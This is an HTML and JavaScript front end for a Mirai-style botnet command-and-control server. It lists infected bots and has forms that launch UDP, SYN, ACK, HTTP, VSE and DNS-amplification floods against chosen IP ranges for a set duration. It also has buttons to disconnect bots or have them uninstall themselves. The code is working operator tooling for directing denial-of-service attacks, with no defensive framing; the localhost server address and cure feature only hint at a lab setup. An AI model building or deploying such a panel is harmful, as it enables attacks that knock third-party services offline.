<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mirai Command Center - Control Panel</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
      color: #fff;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      max-width: 1400px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 10px;
    }

    .header h1 {
      font-size: 2.5em;
      margin-bottom: 10px;
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
    }

    .status-bar {
      display: flex;
      gap: 20px;
      margin-bottom: 30px;
    }

    .stat-card {
      flex: 1;
      background: rgba(0, 0, 0, 0.4);
      padding: 20px;
      border-radius: 10px;
      text-align: center;
      border: 2px solid rgba(255, 255, 255, 0.1);
    }

    .stat-value {
      font-size: 3em;
      font-weight: bold;
      color: #4CAF50;
      text-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
    }

    .stat-label {
      font-size: 0.9em;
      opacity: 0.8;
      margin-top: 5px;
    }

    .panels {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
      margin-bottom: 20px;
    }

    .panel {
      background: rgba(0, 0, 0, 0.4);
      border-radius: 10px;
      padding: 20px;
      border: 2px solid rgba(255, 255, 255, 0.1);
    }

    .panel h2 {
      margin-bottom: 15px;
      padding-bottom: 10px;
      border-bottom: 2px solid rgba(255, 255, 255, 0.2);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .bot-list {
      max-height: 400px;
      overflow-y: auto;
    }

    .bot-item {
      background: rgba(255, 255, 255, 0.1);
      padding: 15px;
      margin-bottom: 10px;
      border-radius: 5px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      transition: all 0.3s;
    }

    .bot-item:hover {
      background: rgba(255, 255, 255, 0.2);
      transform: translateX(5px);
    }

    .bot-info {
      flex: 1;
    }

    .bot-ip {
      font-weight: bold;
      font-size: 1.1em;
      margin-bottom: 5px;
    }

    .bot-meta {
      font-size: 0.85em;
      opacity: 0.7;
    }

    .bot-actions {
      display: flex;
      gap: 10px;
    }

    button {
      padding: 8px 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
      transition: all 0.3s;
    }

    .btn-danger {
      background: #f44336;
      color: white;
    }

    .btn-danger:hover {
      background: #d32f2f;
      box-shadow: 0 0 15px rgba(244, 67, 54, 0.5);
    }

    .btn-warning {
      background: #ff9800;
      color: white;
    }

    .btn-warning:hover {
      background: #f57c00;
      box-shadow: 0 0 15px rgba(255, 152, 0, 0.5);
    }

    .btn-success {
      background: #4CAF50;
      color: white;
    }

    .btn-success:hover {
      background: #45a049;
      box-shadow: 0 0 15px rgba(76, 175, 80, 0.5);
    }

    .btn-primary {
      background: #2196F3;
      color: white;
    }

    .btn-primary:hover {
      background: #1976D2;
      box-shadow: 0 0 15px rgba(33, 150, 243, 0.5);
    }

    .attack-form {
      display: grid;
      gap: 15px;
    }

    .form-group {
      display: flex;
      flex-direction: column;
      gap: 5px;
    }

    label {
      font-weight: bold;
      font-size: 0.9em;
    }

    input,
    select,
    textarea {
      padding: 10px;
      border-radius: 5px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      background: rgba(255, 255, 255, 0.1);
      color: #fff;
      font-size: 1em;
    }

    input:focus,
    select:focus,
    textarea:focus {
      outline: none;
      border-color: #4CAF50;
      box-shadow: 0 0 10px rgba(76, 175, 80, 0.3);
    }

    .attack-item {
      background: rgba(255, 152, 0, 0.2);
      padding: 15px;
      margin-bottom: 10px;
      border-radius: 5px;
      border-left: 4px solid #ff9800;
    }

    .attack-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 10px;
    }

    .attack-name {
      font-weight: bold;
      font-size: 1.1em;
    }

    .attack-progress {
      width: 100%;
      height: 8px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 4px;
      overflow: hidden;
      margin-top: 10px;
    }

    .attack-progress-bar {
      height: 100%;
      background: linear-gradient(90deg, #4CAF50, #8BC34A);
      transition: width 0.3s;
    }

    .log {
      background: #000;
      padding: 15px;
      border-radius: 5px;
      font-family: 'Courier New', monospace;
      font-size: 0.85em;
      max-height: 200px;
      overflow-y: auto;
    }

    .log-entry {
      margin-bottom: 5px;
    }

    .log-time {
      color: #888;
    }

    .log-info {
      color: #4CAF50;
    }

    .log-warning {
      color: #ff9800;
    }

    .log-error {
      color: #f44336;
    }

    ::-webkit-scrollbar {
      width: 8px;
    }

    ::-webkit-scrollbar-track {
      background: rgba(0, 0, 0, 0.2);
    }

    ::-webkit-scrollbar-thumb {
      background: rgba(255, 255, 255, 0.3);
      border-radius: 4px;
    }

    ::-webkit-scrollbar-thumb:hover {
      background: rgba(255, 255, 255, 0.5);
    }

    .pulse {
      animation: pulse 2s infinite;
    }

    @keyframes pulse {

      0%,
      100% {
        opacity: 1;
      }

      50% {
        opacity: 0.5;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="header">
      <h1>🎯 MIRAI COMMAND CENTER</h1>
      <p>Full Control Panel - Server: <span id="server-status" class="pulse">Connecting...</span></p>
    </div>

    <div class="status-bar">
      <div class="stat-card">
        <div class="stat-value" id="active-bots">0</div>
        <div class="stat-label">Active Bots</div>
      </div>
      <div class="stat-card">
        <div class="stat-value" id="total-bots">0</div>
        <div class="stat-label">Total Bots Ever</div>
      </div>
      <div class="stat-card">
        <div class="stat-value" id="active-attacks">0</div>
        <div class="stat-label">Active Attacks</div>
      </div>
      <div class="stat-card">
        <div class="stat-value" id="server-uptime">0s</div>
        <div class="stat-label">Server Uptime</div>
      </div>
    </div>

    <div class="panels">
      <div class="panel">
        <h2>
          <span>📡 Connected Bots</span>
          <button class="btn-primary" onclick="refreshBots()">🔄 Refresh</button>
        </h2>
        <div class="bot-list" id="bot-list">
          <p style="text-align: center; opacity: 0.5;">No bots connected</p>
        </div>
      </div>

      <div class="panel">
        <h2>
          <span>⚡ Launch Attack</span>
        </h2>
        <div class="attack-form">
          <div class="form-group">
            <label>Attack Name:</label>
            <input type="text" id="attack-name" placeholder="MyAttack" value="TestAttack">
          </div>
          <div class="form-group">
            <label>Attack Type:</label>
            <select id="attack-type">
              <option value="UDP">UDP Flood</option>
              <option value="SYN">SYN Flood</option>
              <option value="ACK">ACK Flood</option>
              <option value="HTTP">HTTP Flood</option>
              <option value="VSE">VSE Flood</option>
              <option value="DNS">DNS Amplification</option>
            </select>
          </div>
          <div class="form-group">
            <label>Targets (IP/CIDR, one per line):</label>
            <textarea id="attack-targets" rows="3" placeholder="192.168.1.100&#10;10.0.0.0/24"></textarea>
          </div>
          <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="attack-duration" value="60" min="1" max="3600">
          </div>
          <button class="btn-success" onclick="launchAttack()">🚀 LAUNCH ATTACK</button>
          <button class="btn-danger" onclick="stopAllAttacks()">🛑 STOP ALL ATTACKS</button>
        </div>
      </div>
    </div>

    <div class="panel">
      <h2>
        <span>💥 Active Attacks</span>
        <button class="btn-primary" onclick="refreshAttacks()">🔄 Refresh</button>
      </h2>
      <div id="attack-list">
        <p style="text-align: center; opacity: 0.5;">No active attacks</p>
      </div>
    </div>

    <div class="panel">
      <h2>📋 System Log</h2>
      <div class="log" id="log"></div>
    </div>
  </div>

  <script>
    const API_URL = 'http://localhost:8080/api';
    let autoRefresh = true;

    function log(message, type = 'info') {
      const logDiv = document.getElementById('log');
      const now = new Date().toLocaleTimeString();
      const entry = document.createElement('div');
      entry.className = `log-entry log-${type}`;
      entry.innerHTML = `<span class="log-time">[${now}]</span> ${message}`;
      logDiv.insertBefore(entry, logDiv.firstChild);

      // Keep only last 50 entries
      while (logDiv.children.length > 50) {
        logDiv.removeChild(logDiv.lastChild);
      }
    }

    async function fetchAPI(endpoint, options = {}) {
      try {
        const response = await fetch(`${API_URL}${endpoint}`, {
          ...options,
          headers: {
            'Content-Type': 'application/json',
            ...options.headers
          }
        });
        return await response.json();
      } catch (error) {
        log(`API Error: ${error.message}`, 'error');
        return null;
      }
    }

    async function refreshStatus() {
      const data = await fetchAPI('/status');
      if (data && data.success) {
        document.getElementById('active-bots').textContent = data.active_bots;
        document.getElementById('total-bots').textContent = data.total_bots_ever;
        document.getElementById('active-attacks').textContent = data.active_attacks;
        document.getElementById('server-uptime').textContent = Math.floor(data.stats.uptime_seconds) + 's';
        document.getElementById('server-status').textContent = 'Connected ✓';
        document.getElementById('server-status').className = '';
        document.getElementById('server-status').style.color = '#4CAF50';
      }
    }

    async function refreshBots() {
      const data = await fetchAPI('/bots');
      if (data && data.success) {
        const botList = document.getElementById('bot-list');

        if (data.bots.length === 0) {
          botList.innerHTML = '<p style="text-align: center; opacity: 0.5;">No bots connected</p>';
          return;
        }

        botList.innerHTML = data.bots.map(bot => `
                    <div class="bot-item">
                        <div class="bot-info">
                            <div class="bot-ip">🤖 ${bot.ip}</div>
                            <div class="bot-meta">
                                v${bot.version} | ${bot.source || 'unknown'} | 
                                Uptime: ${Math.floor(bot.uptime_seconds / 60)}m
                            </div>
                        </div>
                        <div class="bot-actions">
                            <button class="btn-warning" onclick="removeBot('${bot.id}', '${bot.ip}')">
                                ❌ Remove
                            </button>
                            <button class="btn-danger" onclick="cureBot('${bot.id}', '${bot.ip}')">
                                💊 Cure
                            </button>
                        </div>
                    </div>
                `).join('');

        log(`Refreshed: ${data.bots.length} bots connected`, 'info');
      }
    }

    async function refreshAttacks() {
      const data = await fetchAPI('/attacks');
      if (data && data.success) {
        const attackList = document.getElementById('attack-list');

        if (data.attacks.length === 0) {
          attackList.innerHTML = '<p style="text-align: center; opacity: 0.5;">No active attacks</p>';
          return;
        }

        attackList.innerHTML = data.attacks.map(atk => `
                    <div class="attack-item">
                        <div class="attack-header">
                            <div>
                                <div class="attack-name">#${atk.id} ${atk.name}</div>
                                <div>${atk.type} → ${atk.targets.join(', ')}</div>
                            </div>
                            <button class="btn-danger" onclick="stopAttack(${atk.id})">Stop</button>
                        </div>
                        <div style="font-size: 0.9em; opacity: 0.8;">
                            ${atk.bot_count} bots | ${atk.seconds_remaining}s / ${atk.duration}s remaining
                        </div>
                        <div class="attack-progress">
                            <div class="attack-progress-bar" style="width: ${atk.progress_percent}%"></div>
                        </div>
                    </div>
                `).join('');
      }
    }

    async function removeBot(botId, botIp) {
      if (!confirm(`Remove bot ${botIp}?\n\nThis will disconnect the bot but leave it installed on the target system.`)) {
        return;
      }

      log(`Removing bot ${botIp}...`, 'warning');
      const data = await fetchAPI('/bots/remove', {
        method: 'POST',
        body: JSON.stringify({ bot_id: botId })
      });

      if (data && data.success) {
        log(`✓ Bot ${botIp} removed successfully`, 'info');
        refreshBots();
        refreshStatus();
      } else {
        log(`✗ Failed to remove bot: ${data?.error || 'Unknown error'}`, 'error');
      }
    }

    async function cureBot(botId, botIp) {
      if (!confirm(`CURE bot ${botIp}?\n\n⚠️ This will:\n- Stop all attacks\n- Remove persistence\n- Delete the malware\n- Clean up files\n\nThe bot will uninstall itself completely!`)) {
        return;
      }

      log(`Sending cure command to ${botIp}...`, 'warning');
      const data = await fetchAPI('/bots/cure', {
        method: 'POST',
        body: JSON.stringify({ bot_id: botId })
      });

      if (data && data.success) {
        log(`✓ ${data.message}`, 'info');
        log(`  ${data.details}`, 'info');
        setTimeout(() => {
          refreshBots();
          refreshStatus();
        }, 2000);
      } else {
        log(`✗ Failed to cure bot: ${data?.error || 'Unknown error'}`, 'error');
      }
    }

    async function launchAttack() {
      const name = document.getElementById('attack-name').value;
      const type = document.getElementById('attack-type').value;
      const targetsText = document.getElementById('attack-targets').value;
      const duration = parseInt(document.getElementById('attack-duration').value);

      const targets = targetsText.split('\n').map(t => t.trim()).filter(t => t.length > 0);

      if (targets.length === 0) {
        alert('Please enter at least one target!');
        return;
      }

      if (!confirm(`Launch ${type} attack against ${targets.length} target(s) for ${duration}s?`)) {
        return;
      }

      log(`Launching ${type} attack: ${name}`, 'warning');

      const data = await fetchAPI('/attacks/start', {
        method: 'POST',
        body: JSON.stringify({
          Name: name,
          Type: type,
          Targets: targets,
          Duration: duration,
          Options: {}
        })
      });

      if (data && data.success) {
        log(`✓ Attack #${data.attack_id} launched with ${data.bots_used} bots!`, 'info');
        refreshAttacks();
        refreshStatus();
      } else {
        log(`✗ Failed to launch attack: ${data?.error || 'Unknown error'}`, 'error');
      }
    }

    async function stopAttack(attackId) {
      log(`Stopping attack #${attackId}...`, 'warning');

      const data = await fetchAPI('/attacks/stop', {
        method: 'POST',
        body: JSON.stringify({ attack_id: attackId })
      });

      if (data && data.success) {
        log(`✓ Attack #${attackId} stopped`, 'info');
        refreshAttacks();
        refreshStatus();
      }
    }

    async function stopAllAttacks() {
      if (!confirm('Stop ALL active attacks?')) {
        return;
      }

      log('Stopping all attacks...', 'warning');

      const data = await fetchAPI('/attacks/stopall', {
        method: 'POST'
      });

      if (data && data.success) {
        log('✓ All attacks stopped', 'info');
        refreshAttacks();
        refreshStatus();
      }
    }

    // Auto-refresh every 2 seconds
    setInterval(() => {
      if (autoRefresh) {
        refreshStatus();
        refreshBots();
        refreshAttacks();
      }
    }, 2000);

    // Initial load
    log('Control Panel initialized', 'info');
    refreshStatus();
    refreshBots();
    refreshAttacks();
  </script>
</body>

</html>
